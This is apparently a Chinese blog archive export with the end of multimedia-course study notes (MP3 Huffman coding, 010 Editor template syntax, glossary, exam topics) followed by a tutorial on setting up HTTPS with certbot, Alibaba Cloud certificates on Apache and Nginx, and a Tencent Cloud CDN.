	codeword      // hcod[|x|][|y|], length is hlen[|x|][|y|]
	linbitsx      // 如果(x=15)，则构成一个ESC码。在这种情况下，该字段的长度为linbits，否则为零。该字段中包含的无符号整数加上15，以确定编码数据的绝对值。
	signx         // sign of x (transmitted only if x not equal 0)
	linbitsy      // See linbitsx.
	signy         // sign of y (transmitted only if y not equal 0)
}
</code></pre>
<p>只有在实际标记了大于或等于 15 的值时，才会使用 ESCaped 代码 linbitsx 或 linbitsy。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110200755.webp" alt="image.png"></p>
<p>Huffman 编码</p>
<p>对于频谱的高端部分，使用两个特殊的 Huffman 表对值的四元组进行编码。</p>
<pre><code class="language-c">struct quad_word {
	codeword // hcod[|v|][|w|][|x|][|y|]，hlen[|v|][|w|][|x|][|y|]
	signv    //（仅当v不等于0时）
	signw    //（仅当w不等于0时）
	signx    //（仅当x不等于0时）
	signy    //（仅当y不等于0时）
}
</code></pre>
<p>在频谱的高端部分，只需计算零对的数量。由于当其他值已解码时，这个值是隐含已知的，因此不需要传输。</p>
<p>Huffman 编码数据的排序方式：</p>
<ul>
<li>如果 block_type 为 0、1 或 3，则根据频率递增的顺序对 Huffman 编码数据进行排序。</li>
<li>如果 block_type 为 2（短块），则 Huffman 编码数据的排序如下：
<ul>
<li>首先给出连续的比例因子带的 Huffman 编码数据，从比例因子带 0 开始，以比例因子带 11 结束。</li>
<li>在每个比例因子带内，按照时间窗口的顺序给出数据，从窗口 0 开始，以窗口 2 结束。每个窗口内的数据值按照频率递增的顺序排列。</li>
</ul>
</li>
</ul>
<p>Characteristic of 32 Huffman tables:</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110201127.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231110201152.webp" alt="image.png"></p>
<p>TIP: 考试的时候以长块为准。</p>
<p><code>cb_limit</code> - 长块（block_type != 2）的比例因子带数量。对于所有模式和所有采样频率的 Layer III，这是一个常数，为 21。</p>
<p><code>cb_limit_short</code> - 短块（block_type=2）的比例因子带数量。对于所有模式和所有采样频率的 Layer III，这是一个常数，为 12。</p>
<p><code>window</code> - 在 block_type=2 的情况下，实际时间槽的数量。window 的取值为 0、1、2。</p>
<h1>88、010 编辑器之模板的使用</h1>
<h2>什么是 010 编辑器</h2>
<p>010 编辑器是一个专业的文本/HEX 编辑器，它可以快速并易于编辑电脑上的任何文件内容。</p>
<ul>
<li>查看并编辑任何硬盘上的二进制文件，以及文本文件（Unicode 文件、C/C++ 源文件等）</li>
<li>独家的二进制模板技术能让你理解任何二进制文件</li>
<li>通过强大的工具（查找、替换等功能）分析并编辑文本以及二进制数据</li>
<li>使用硬盘、软盘等查找并修复问题</li>
</ul>
<h2>二进制模板</h2>
<p>010 编辑器可以将二进制文件已易于使用的方式将其结构呈现在你的面前。二进制模板可以将二进制文件解析为指定的结构。</p>
<p>模板有着和 C/C++ 相似的结构，但它们是以一个程序运行的。当模板中的变量声明后，变量将映射到当前文件的对应字节集合。</p>
<p><span style="color:#ff0000">例子：</span></p>
<pre><code class="language-C">struct FILE {
    struct HEADER {
        char type[4];   // 映射文件的0~3字节（注意，从0开始数）
        int version;    // 映射文件的4~7字节
        int numRecords; // 映射文件的8~11字节
    } header;
    struct RECORD {
        int employeeId;
        char name[40];
        float salary;
    } record[header.numRecords];
} file;
</code></pre>
<p>当访问一个变量时，其值从文件中读出；当对一个变量进行赋值时，其值将写回文件。</p>
<p>这些模板的 <code>structures</code> 和常规的 C 不同，因为它包含了控制语句，如 if，for，while。</p>
<p>模板的执行顺序为从文件顶端到底部。</p>
<h2>写一个二进制模板</h2>
<h3>模板基础</h3>
<p>模板可以使二进制文件更容易理解和编辑。每一个模板是以 <code>.bt</code> 为后缀的文本文件，可以被 010 编辑器编辑。</p>
<h3>数字</h3>
<p>Decimal - 456</p>
<p>Hexadecimal - 0xff, 25h, 0EFh</p>
<p>Octal - 013 (任何数字前加 0)</p>
<p>Binary - 0b011</p>
<p>无符号值：数字后加 <code>u</code>，例如 12u</p>
<p>8 字节的 int64：数字后加 <code>L</code>，例如 1L</p>
<p>浮点数中对于一个指数会包含 e，例如 1e10</p>
<p>浮点数默认为 8 字节 double 型，除非数字后加了 f（4 字节 float，例子：2.0f）</p>
<h3>数据类型</h3>
<p>8-Bit Signed Integer - char, byte, CHAR, BYTE</p>
<p>8-Bit Unsigned Integer - uchar, ubyte, UCHAR, UBYTE</p>
<p>16-Bit Signed Integer - short, int16, SHORT, INT16</p>
<p>16-Bit Unsigned Integer - ushort, uint16, USHORT, UINT16, WORD</p>
<p>32-Bit Signed Integer - int, int32, long, INT, INT32, LONG</p>
<p>32-Bit Unsigned Integer - uint, uint32, ulong, UINT, UINT32, ULONG, DWORD</p>
<p>64-Bit Signed Integer - int64, quad, QUAD, INT64, __int64</p>
<p>64-Bit Unsigned Integer - uint64, uquad, UQUAD, UINT64, QWORD, __uint64</p>
<p>32-Bit Floating Point Number - float, FLOAT</p>
<p>64-Bit Floating Point Number - double, DOUBLE</p>
<p>模板中可以使用数字类型，但数字在被运算前，必须转换为 int 或 float</p>
<h3>类型定义 typedef</h3>
<p>其他类型可以通过 <code>typedef</code> 关键字创建。</p>
<pre><code class="language-C">// 创建类型语法：
typedef &lt;data_type&gt; &lt;new_type_name&gt;
// 例子：创建新类型myInt，表示无符号整数
typedef unsigned int myInt;

// 运用于数组：
typedef &lt;data_type&gt; &lt;new_type_name&gt; [ &lt;array_size&gt; ]
// array_size必须为常量，typedef不能用于创建多维数组，但可以在structs中使用。
// 例子：生成新的字符串类型数组
typedef char myString[15];
myString s = &quot;Test&quot;;
</code></pre>
<h3>声明模板变量</h3>
<p>声明变量的方法类似于 C 语言但有一个重要的区别：模板中已声明的变量映射到文件中的一组字节。</p>
<p>可以通过定义 structs 或 unions 的方法将模板变量组织起来。</p>
<h3>特殊属性</h3>
<p>变量后后面可以使用 <code>&lt;&gt;</code> 将一个或多个的特殊属性括住。</p>
<p>支持以下属性：</p>
<pre><code class="language-C">&lt;
    format  = hex|decimal|octal|binary,
    fgcolor = &lt;color&gt;,
    bgcolor = &lt;color&gt;,
    comment = &quot;&lt;string&gt;&quot;,
    open    = true|false|suppress,
    hidden  = true|false,
    read    = &lt;function_name&gt;
&gt;
</code></pre>
<h3>局部变量</h3>
<p>在有些情况中，一些变量不需要映射到文件中的值或者显示在「模板结果」中（可以右击「模板结果」开启局部变量的查看）。我们可以使用关键字 <code>local</code> 声明变量。例子：</p>
<pre><code class="language-C">local int i, total = 0;
int recordCounts[5];
for( i = 0; i &lt; 5; i++ )
    total += recordCounts[i];
double records[ total ];
</code></pre>
<h3>字符串</h3>
<p>通常二进制文件中定义了 Null 结尾的字符串。010 编辑器可以通过特殊的语法进行阅读：</p>
<pre><code class="language-C">// 以下两种方法将读取字符串，直到遇到「0」字节
char str[];
string str;
// Unicode 字符串可以使用以下两种方法阅读：
wchar_t str[];
wstring str;
</code></pre>
<p>字符串中可以使用=、+、+=以及比较运算符，例子：</p>
<pre><code class="language-C">local char str[15] = &quot;First&quot;;
local string s = &quot;Second&quot;;
local string r1 = str + s;
local string r2 = str;
r2 += s;
return (r1 == r2);
</code></pre>
<h3>颜色</h3>
<p>解析文件时，使用模板可以将不同颜色应用到不同的变量上，有两种方式：</p>
<ul>
<li>方式一：对单个变量设置颜色<pre><code class="language-C">// 语法：在变量后添加以下标签
&lt;fgcolor=???&gt; // 设置前景色
&lt;bgcolor=???&gt; // 设置背景色
// 例子：
int id &lt;fgcolor=cBlack, bgcolor=0x0000FF&gt;;
</code></pre>
</li>
<li>方式二：使用 <code>SetForeColor</code>，<code>SetBackColor</code>，<code>SetColor</code> 函数设置默认颜色。<pre><code class="language-C">// 在这些函数后定义变量
SetForeColor( cRed );
int first; // will be colored red
int second; // will be colored red

// 关闭涂色的方法
SetForeColor( cNone );
int third; // will not be colored
</code></pre>
</li>
</ul>
<h3>顺序</h3>
<p>当每一个模板变量都声明后，「当前文件的位置」将向前移动。可以通过使用函数 FTell 获取「当前文件位置」。</p>
<p>通过使用 FSeek 或 FSkip 函数，「当前位置」可以在整个文件中移动。这项技术允许我们不按顺序解析文件。</p>
<p>可以使用 ReadByte, ReadShort, ReadInt 等函数实现不定义变量而读取文件。</p>
<blockquote>
<p>[!hint] 考点 14：010 编辑器：Array、Struct</p>
</blockquote>
<h3>结构 struct</h3>
<p>关键字 <code>struct</code> 可以定义一个数据结构。可以使用 C/C++ 语法进行定义。例子：</p>
<pre><code class="language-C">// 生成新类型myStruct，但不声明任何变量
struct myStruct {
    int a;
    int b;
    int c;
};
// 声明一个结构
myStruct s;

// 定义结构并声明两个实例
// 其中，s1覆盖文件的前12个字节，s2覆盖接下来的12个字节
struct myStruct {
    int a; // 4字节
    int b;
    int c;
} s1, s2;
</code></pre>
<p>使用控制语句（<code>if</code>，<code>for</code>，<code>while</code>）的结构。例子：</p>
<pre><code class="language-C">// 实例s只生成两个变量：a、b或a、c
struct myIfStruct {
    int a;
    if( a &gt; 5 )
        int b;
    else
        int c;
} s;
</code></pre>
<p>结构可以嵌套，也可以声明数组。例子：</p>
<pre><code class="language-C">struct {
    int width;
    struct COLOR {
        uchar r, g, b;
    } colors[width];
} line1;
</code></pre>
<p>使用 typedef 定义 struct 的别名：</p>
<pre><code class="language-C">typedef struct {
    ushort id;
    int size;
} myData;
</code></pre>
<h3>联合 union</h3>
<p>union 中，所有变量从相同的位置开始。union 的大小为其中最大变量的大小。</p>
<p>可以使用和 struct 相同的语法进行声明。例子：</p>
<pre><code class="language-C">// 以下Union大小为8字节
union myUnion {
    ushort s;
    double d; // 8字节
    int i;
} u;
</code></pre>
<h3>带参数的 struct 和 union</h3>
<p>struct 或 union 关键字后可以接参数列表。参数列表的定义和函数相似。例子：</p>
<pre><code class="language-C">struct VarSizeStruct (int arraySize)
{
    int array[arraySize];
};
// 声明实例。传递参数到结构体中
VarSizeStruct s1(5);

// 可以使用typedef声明
typedef struct (int arraySize)
{
    int array[arraySize];
} VarSizeStruct;
</code></pre>
<h3>数组 Array</h3>
<p>数组变量定义的语法：</p>
<pre><code class="language-C">&lt;data type&gt; &lt;variable name&gt; [ &lt;expression&gt; ] // 例子：int myArray[15];
</code></pre>
<p>一些例子：</p>
<pre><code class="language-C">// 与ANSI C不同的是，数组的大小可以为任意表达式（包括变量、函数或操作符）
int myArray[ FileSize() - myInt * 0x10 + (17 &lt;&lt; 5) ];

// 使用中括号获取单个元素
myArray[i] = value;
</code></pre>
<p>当数组的大小定义为 0 时将有警告提示（不是异常）并且不声明任何变量。</p>
<p>010 编辑器允许数组以特殊的方式构建。当定义模板变量时，可以定义多个名称相同的变量。010 编辑器将这些相同变量看作数组，称之为 Duplicate Array。例子：</p>
<pre><code class="language-C">int x; int x; int x;
// 可以这样读取：
x[0]; // 读取第一个x的值
</code></pre>
<p>可以使用 for 或 while 定义 Duplicate arrays：</p>
<pre><code class="language-C">local int i;
for( i = 0; i &lt; 5; i++ )
    int x;
</code></pre>
<h3>表达式</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231101183949.webp" alt="image.png"></p>
<p>可以使用任何的赋值运算符：+=, -=, *=, /=, &amp;=, ^=, %=, |=, &lt;&lt;=, &gt;&gt;=</p>
<p>可以使用小括号组合表达式。</p>
<h3>布尔运算符</h3>
<p>&amp;&amp;（AND)</p>
<p>||(OR)</p>
<p>!(NOT- 单操作符)</p>
<p>可以使用小括号指定操作顺序。</p>
<h3>控制语句</h3>
<p>可以使用 break、continue、return</p>
<h4>if 语句</h4>
<pre><code class="language-C">if( x &lt; 5 )
    x = 0;

if( y &gt; x )
    max = y;
else
{
    max = x;
    y = 0;
}
</code></pre>
<h4>for 语句</h4>
<pre><code class="language-C">for( i = 0, x = 0; i &lt; 15; i++ )
{
    x += i;
}
</code></pre>
<h4>while 语句</h4>
<pre><code class="language-C">while( myVar &lt; 15 )
{
    x *= myVar;
    myVar += 2;
}

do
{
    x *= myVar;
    myVar += 2;
}while( myVar &lt; 23 );
</code></pre>
<h4>switch 语句</h4>
<pre><code class="language-C">switch( &lt;variable&gt; )
{
    case &lt;expression&gt;: &lt;statement&gt;; [break;]
    ...
    default : &lt;statement&gt;;
}
</code></pre>
<h3>比特域</h3>
<p>比特域允许细分结构为多组比特。这一过程允许将多个变量打包成一个块的内存。</p>
<p>定义比特域的语法：</p>
<pre><code class="language-C">type_name &lt;variable_name&gt; : number_of_bits;
// type_name 可以是char, short, int, int64 (unsigned or signed) 或其他的等效类型
</code></pre>
<p>如果变量名省略，那么对应这个变量的比特数也将省略。例子：</p>
<pre><code class="language-C">// 打包alpha和beta为一个32比特的值中，但忽略中间的12bit
int alpha : 5;
int      : 12;
int beta : 15;
</code></pre>
<h4>比特域模式</h4>
<p>010 编辑器有两个特殊的比特域模式，定义了比特如何打包到变量中：</p>
<ul>
<li>padded bitfields（默认）。比特打包为变量的方式取决于当前的字节顺序（大小端）。默认为，小端文件从右到左打包，大端文件从左往右打包。</li>
<li>unpadded bitfields</li>
</ul>
<h5>Padded bitfields</h5>
<p>例子：</p>
<pre><code class="language-C">ushort a : 4;
ushort b : 7;
ushort c : 5;
// 小端模式下，结构存储为：cccccbbb bbbbaaaa
// 大端模式下，结构存储为：aaaabbbb bbbccccc
</code></pre>
<p>当需要的时候，程序会增加填充。例如某些特定的比特域将跨越变量的边界，这将会添加填充使得比特域从下一个变量开始。例如：</p>
<pre><code class="language-C">// 第一个变量
int apple : 10;
int orange : 20;
// 第二个变量
int banana : 10;
int peach : 12;
// 此处填充10个比特
// 第三个变量
short grape : 4; // 字节类型改变为short
</code></pre>
<h5>Unpadded Bitfields</h5>
<p>将文件视为一个长长的比特流，不管是变量类型改变时还是比特不能被打包为单个变量时，都不存在任何的填充比特。</p>
<p>进入此模式的方法：调用 <code>BitfieldDisablePadding</code> 函数（调用 <code>BitfieldEnablePadding</code> 以返回 padding 模式）</p>
<p>在 unpadded Bitfield 模式中，每一个定义的变量从比特流中读取比特。例如：</p>
<pre><code class="language-C">BitfieldDisablePadding();
short a : 10; // 从文件中读取10个比特
int   b : 20; // 读取接下来的20个比特
short c : 10;
// 如果比特域被定义为从右到左读取（小端数据的默认方式，或使用了BitfieldRightToLeft函数）
// 变量将以此方式存储比特：aaaaaaaa bbbbbbaa bbbbbbbb ccbbbbbb cccccccc
</code></pre>
<h3>函数</h3>
<p>010 编辑器中内置有大量的函数。支持许多标准 C 函数，并以首字母大写以区分它们。</p>
<h4>调用</h4>
<p>使用典型 C 语言语法进行函数调用：<code>&lt;function name&gt; ( &lt;argument_list&gt; )</code>，例子：<code>Strlen(str);</code></p>
<h4>定义</h4>
<p>常规 C 语法：<code>&lt;return type&gt; &lt;function name&gt; ( &lt;argument_list&gt; ) {&lt;statements&gt; }</code></p>
<p>return type 可以为 void 或其他支持的数据类型。</p>
<h4>函数的参数</h4>
<p>函数通常使用值传递，在变量名称前加上 <code>&amp;</code> 可以使用引用传递。</p>
<p>在参数名称后加上 <code>[]</code> 表明其为数组类型，数组类型会尽量为引用传递，否则为值传递。</p>
<h4>接口函数</h4>
<h4><code>int Printf(const char format[][,argument,...])</code></h4>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231101184106.webp" alt="image.png"></p>
<p>支持宽度、精度、对齐的调整。如 <code>%5.2lf</code> 或 <code>%-15s</code>。<code>\n</code> 表示换行。</p>
<h4><code>void Warning(const char format[] [,argument,...])</code></h4>
<p>和 <code>Printf</code> 函数相似，但结果字符串显示在状态栏中，并以橘色高亮显示。通常用于显示模板中的错误。</p>
<h4>I/O 函数</h4>
<h4><code>void BigEndian()</code></h4>
<p>表明所有从文件中读写的子序列使用大端顺序。用于指定变量的字节顺序。</p>
<h4><code>void LittleEndian()</code></h4>
<p>小端。</p>
<h5>读取函数</h5>
<p>char ReadByte( int64 pos )</p>
<p>double ReadDouble( int64 pos )</p>
<p>float ReadFloat( int64 pos )</p>
<p>int ReadInt( int64 pos )</p>
<p>int64 ReadInt64( int64 pos )</p>
<p>int64 ReadQuad( int64 pos )</p>
<p>short ReadShort( int64 pos )</p>
<p>uchar ReadUByte( int64 pos )</p>
<p>uint ReadUInt( int64 pos )</p>
<p>uint64 ReadUInt64( int64 pos )</p>
<p>uint64 ReadUQuad( int64 pos )</p>
<p>ushort ReadUShort( int64 pos )</p>
<p>返回从地址 pos 读取文件的内容。用于不声明任何变量从文件中读取数据。</p>
<h4><code>int FEof()</code></h4>
<p>如果当前读取位置为文件末尾，则返回 true。</p>
<h4><code>int64 FileSize()</code></h4>
<p>返回当前文件的比特数。</p>
<h4><code>int FSeek(int64 pos)</code></h4>
<p>设置当前读取位置为 pos 指向的地址。如果地址超出范围返回 -1，成功则返回 0。</p>
<h4><code>int FSkip(int64 offset)</code></h4>
<p>将当前读取位置向前移动 offset 字节。offset 可以为负，即将读取位置向后移动。如果地址超出范围返回 -1，成功则返回 0。</p>
<h4><code>int64 FTell()</code></h4>
<p>返回当前文件的读取位置。</p>
<h5>数学函数</h5>
<p><code>double Abs(double x)</code></p>
<p><code>double Ceil(double x)</code></p>
<p><code>double Cos(double a)</code> <code>double Sin(double a)</code> <code>double Tan(double a)</code> The angle is given in degrees.</p>
<p><code>double Exp(double x)</code></p>
<p><code>double Floor(double x)</code></p>
<p><code>double Log(double x)</code> 计算 x 的自然对数，ln(x)</p>
<p><code>double Max(double a, double b)</code> <code>double Min(double a, double b)</code></p>
<p><code>double Pow(double x, double y)</code></p>
<p><code>int Random(int maximum)</code> 返回 0 到 maximum-1 的随机整数</p>
<p><code>double Sqrt(double x )</code> 计算数字 x 的正平方根</p>
<p><code>data_type SwapBytes(data_type x)</code> 交换变量的比特并返回结果，可以指定任何的数据类型 (byte, short, int, int64, float, double)</p>
<h3>模板限制</h3>
<ul>
<li>不允许使用指针</li>
<li>不支持 goto 语句</li>
<li>不支持多维数组（包括字符串数组）的定义。写模板时，struct 和数组的合并可以模拟多维数组。例如：<pre><code class="language-C">typedef struct
{
    float row[4];
} MATRIX[4];
MATRIX m;
</code></pre>
</li>
</ul>
<h1>名词解释</h1>
<blockquote>
<p>名词解释是考试内容之一。</p>
</blockquote>
<p>JPEG：Joint Photographic Experts Group 联合图像专家组</p>
<p>MPEG：Moving picture Experts Group 运动图像专家组</p>
<p>TIFF：Tagged Image File Format 标记图像文件格式</p>
<p>AIFF：Audio Interchange File Format 音频交换文件格式</p>
<p>RIFF：Resource Interchange File Format 资源交换档案标准</p>
<p>ISO：International Organization for Standardization</p>
<p>ITU：International Telecommunication Union 国际电信联盟</p>
<p>ITU-T：International Telecommunications Union-Telecommunications</p>
<p>IEC：International Electrotechnical Commission 国际电工委员会</p>
<blockquote>
<p>有另译：International Engineering committee</p>
</blockquote>
<p>PCM：Pulse Code Modulation 脉冲编码调制</p>
<p>DPCM：Differential Pulse-code Modulation 差分脉冲编码调制</p>
<p>ADPCM：Adaptive Differential Pulse Code Modulation 自适应差分脉冲编码调制</p>
<p>AAC：Advanced Audio Coding</p>
<p>AVI：Audio Video Interleave</p>
<p>CODEC：enCOder / DECoder pair，解编码器</p>
<p>DCT：Discrete Cosine Transform</p>
<p>MDCT：modified discrete cosine transform</p>
<p><span style="color:#ff0000">IDR：立即编码刷新</span></p>
<h1>本课知识点</h1>
<p>所有知识点如下：</p>
<ol>
<li>Audio, image and video format, container</li>
<li>Video compression standards and applications</li>
<li>AVI container</li>
<li>Window Bitmap file structure</li>
<li>WAVE format</li>
<li>Explain the meaning of FOURCC tags “ 00db” , “ 01dc” , “01wb” ,“vids” , and “auds” in AVI container.</li>
<li>What is CD data rate?</li>
<li>List the components of a chunk.</li>
<li>Potential coding errors</li>
<li>Lossy compression and lossless compression</li>
<li>Uniform and quantization and nonuniform quantization</li>
<li>entropy and Huffman coding</li>
<li>MS-ADPCM</li>
<li>010 editor: Array, struct</li>
<li>Fourier transform, Fourier series, Discrete time Fourier transform, Discrete Fourier transform</li>
<li>Windowing</li>
<li>FFT and complexity</li>
<li>MDCT: overlap and add technique, long window, short window</li>
<li>Psychoacoustics: Frequency masking, temporal masking, threshold in quiet, signal to masker ratio, critical bandwidth, bark scale, perceptual entropy</li>
<li>MP3: bitstream format, MP3 sampling frequency, stereo/joint channel/dual channel/single channel, Huffman coding region, bit reservoir</li>
<li>MP3 huffman code: linebits</li>
<li>MP3 encoder and decoder process</li>
<li>Color space</li>
<li>Video frame format</li>
<li>Image and video coding principles: four types of redundancy</li>
<li>Three basic types of code frame in video coding</li>
<li>Motion estimation and compensation</li>
<li>JPEG encoding and decoding process: Minimum code Unit, modes of operation, DC entropy coding, AC entropy coding, run-length, size, EOB</li>
<li>JPEG interchange format: image, frame, scan, marker,</li>
<li>JPEG file interchange format</li>
<li>Video encoding and decoding architecture: normative, informative</li>
<li>MPEG coding structure, MPEG syntax</li>
<li>H.264 encoding structure, baseline profile, main profile, vector block size, new features, video coding layer and network abstraction layer</li>
<li>Inter frame prediction, motion vector prediction, Intra-frame prediction</li>
<li>DCT transform in H.264</li>
<li>entropy coding: Exp-Golomb coding and CAVLC</li>
</ol>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="1867823418" class="record">
            <header>
                <h1 class="record-title">Linux 服务器 HTTPS 的配置</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Apache');">Apache</button>
                    
                    <button class="btn" onclick="activeTag('CDN');">CDN</button>
                    
                    <button class="btn" onclick="activeTag('HTTPS');">HTTPS</button>
                    
                    <button class="btn" onclick="activeTag('Linux');">Linux</button>
                    
                    <button class="btn" onclick="activeTag('SSL');">SSL</button>
                    
                    <button class="btn" onclick="activeTag('腾讯云');">腾讯云</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>12/6/2023</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>SSL证书的不同部署方式以及CDN配置HTTPS。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/SSL_certificate-1cover.webp</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>6f54b93a</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!Notice] 文章增补说明<br>
原题目：Linux 服务器添加 SSL 证书，最初于 2022 年 4 月 21 日发布。<br>
现增加 SSL 证书自动部署部分重新发布，原文章永久链接不变。</p>
</blockquote>
<p>让网站加上一个小锁。先展示未安装证书之前：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-6as2.png" alt="|406"></p>
<p>现描述配置步骤如下。</p>
<h1>自动部署方式</h1>
<blockquote>
<p>本节于 2023 年 12 月 6 日新增。</p>
</blockquote>
<p>首先确保相关子域名的 DNS 已经<strong>成功解析</strong>到当前服务器。</p>
<p>安装 certbot：</p>
<pre><code class="language-sh"># CentOS 安装 certbot：
yum install certbot -y
yum install python3-certbot-nginx -y

# Ubuntu 安装 certbot：
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
</code></pre>
<p>使用：</p>
<pre><code class="language-sh">certbot --nginx
# 根据提示进行邮箱输入，以及需要加密的域名选择。首次注册的邮箱会收到认证邮件，记得查收。
</code></pre>
<p>可以发现 Nginx 的配置文件已经出现了变化。比如我要加密的是 push.uuanqin.top 的子域名。现在的配置为：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231206145058.webp" alt="image.png|500"></p>
<p>修改后记得重启 nginx 一下：</p>
<pre><code class="language-sh">systemctl restart nginx
# 或 service nginx restart
</code></pre>
<blockquote>
<p>迁移服务器提示：把 nginx 配置文件迁移到新的服务器上时。在新服务器第一次使用 certbot 前，把之前旧服务器 certbot 在配置文件中自动添加的内容删掉，不然出错。</p>
</blockquote>
<p>其他参考（没试过）：<a href="https://linuxiac.com/zerossl-how-to-install-ssl-certificate/">ZeroSSL: How to Secure Your Website with a Free SSL Certificate (linuxiac.com)</a></p>
<p>certbot 部署的证书有效期为 3 个月，在过期前 1 个月会收到提示。我们可以重新运行 <code>certbot --nginx</code> 对相应的证书进行更新。或者结合 cron 定时任务完成自动更新。cron 用法详见：<a href="#2287168649" title="Linux 使用 Cron 创建定时任务" class="record-link ">Linux 使用 Cron 创建定时任务</a>。</p>
<h1>手动部署方式</h1>
<blockquote>
<p>阿里云免费证书有效期目前调整至 3 个月：<a href="https://help.aliyun.com/zh/ssl-certificate/product-overview/notice-on-adjustment-of-service-policies-for-free-certificates?spm=0.2020520163.0.0.79843711UC7X64">关于免费证书有效期策略调整通知_数字证书管理服务-阿里云帮助中心 (aliyun.com)</a>。一个月后，新产品 <a href="https://help.aliyun.com/zh/ssl-certificate/user-guide/manage-https-acceleration-gateway?spm=a2c4g.11186623.0.i16&amp;short_name=I3.VIJKs&amp;app=chrome">HTTPS加速网关</a> 上市，每月 60 元。</p>
<p>腾讯云目前（2024 年 3 月 7 日）依然保持方法有效期 1 年的免费证书。一年可签发 50 张。但是 2024 年 4 月 25 日以后，免费 SSL 证书有效期将从 12 个月缩短至 3 个月：<a href="https://cloud.tencent.com/document/product/400/104538">SSL 证书 关于免费 SSL 证书策略调整通知-产品公告-文档中心-腾讯云 (tencent.com)</a></p>
</blockquote>
<h2>获取 SSL 免费证书</h2>
<p>在云服务商上申请免费证书。阿里云免费证书有效期为 1 年（2023 年 11 月 14 日以前）。现以阿里云免费证书 <a href="https://common-buy.aliyun.com/?spm=5176.13785142.commonbuy2container.9.73fd778bO616lz&amp;commodityCode=cas_dv_public_cn&amp;request=%7B%22ord_time%22:%221:Year%22,%22order_num%22:1,%22product%22:%22free_product%22,%22certCount%22:%2220%22%7D">云盾证书服务 (aliyun.com)</a> 购买为例：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/HTTPS-1024x476.png" alt=""></p>
<p>在控制台下载证书：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-49-1024x280.png" alt=""></p>
<p>选择 Apache 服务器类型的证书进行下载（图中以 Apache 为例）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-5as1.png" alt="|475"></p>
<p>得到一个压缩文件，文件包含以下内容：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-as50.png" alt="|400"></p>
<ul>
<li>证书文件：以.crt 为后缀或文件类型。</li>
<li>证书链文件：以.crt 为后缀或文件类型。</li>
<li>密钥文件：以.key 为后缀或文件类型。</li>
</ul>
<p>文档链接：<a href="https://help.aliyun.com/document_detail/98727.html?spm=5176.b657008.help.dexternal.7c2a799dBOiNbI">在 Apache 服务器上安装 SSL 证书 (aliyun.com)</a></p>
<blockquote>
<p>如果网站开启了 CDN，更新证书时，请确保加速域名配置的证书是新的证书。</p>
</blockquote>
<h2>安装证书到 Nginx</h2>
<p><a href="https://help.aliyun.com/document_detail/98728.html?spm=a2c4g.198938.0.0.6c2a763e1G7ZPe">在 Nginx 或 Tengine 服务器安装 SSL 证书 (aliyun.com)</a></p>
<h2>安装证书到 Apache</h2>
<p>接下来请根据这篇指引进行配置安装：<a href="https://help.aliyun.com/document_detail/98727.html?spm=5176.b657008.help.dexternal.7c2a799dBOiNbI">在 Apache 服务器上安装 SSL 证书 (aliyun.com)</a></p>
<p>在实际操作中，我和指引中不同的是，mod_ssl.so 不需要在 httpd.conf 里进行引用。阿里云文档里的 http-ssl.conf，实际上就是/etc/httpd/conf.d/ssl.conf（安装好 mod_ssl.so 模块后，ssl.conf 文件就会产生）。</p>
<p>通过 FTP 传输工具把证书上传到指定位置，在配置时就用这个位置（下图）。</p>
<p>httpd.conf：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-52-1024x416.png" alt="|500"></p>
<p>ssl.conf：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imageas-53.png" alt="|500"></p>
<p>弄好后记得重启 Apache 服务器：</p>
<pre><code class="language-sh">apachectl restart
</code></pre>
<p>服务器的安全组记得开放 443 端口：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-5asasd4.png" alt=""></p>
<h1>CDN 中的 HTTPS 设置</h1>
<p>我一开始遇到的问题是这个：Apache 安装好证书后还是无法生效。Chrome 浏览器提醒的是证书不匹配，一看详情，他竟然在匹配腾讯云的 cdn 的证书......所以我认为 CDN 环节中还需要相应设置。（和我遇到同样的问题：<a href="https://cloud.tencent.com/developer/ask/21141">https://cloud.tencent.com/developer/ask/21141</a>）</p>
<p>解决方法如下所述。</p>
<p>如果你的网站开启了 CDN，比如我使用的是腾讯云的 CDN，那么需要在腾讯云控制台中进行设置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-55-1024x86.png" alt=""></p>
<p>按照指引上传证书进行托管：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-56-1024x268.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-5sad7.png" alt="|500"></p>
<p>上传成功后部署即可。</p>
<p>参考文档：<a href="https://cloud.tencent.com/document/product/400/51804">SSL 证书 安装部署 SSL 证书到内容分发网络（CDN）指引 - 证书安装 - 文档中心 - 腾讯云 (tencent.com)</a></p>
<h2>【可选】强制跳转 HTTPS</h2>
<p>在腾讯云域名控制台开启这个：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-63-1024x584.png" alt="|500"></p>
<h1>后续</h1>
<p>WordPress 博客网站使用 HTTPS：<a href="#2062987538" title="WordPress 使用 HTTPS" class="record-link ">WordPress 使用 HTTPS</a></p>
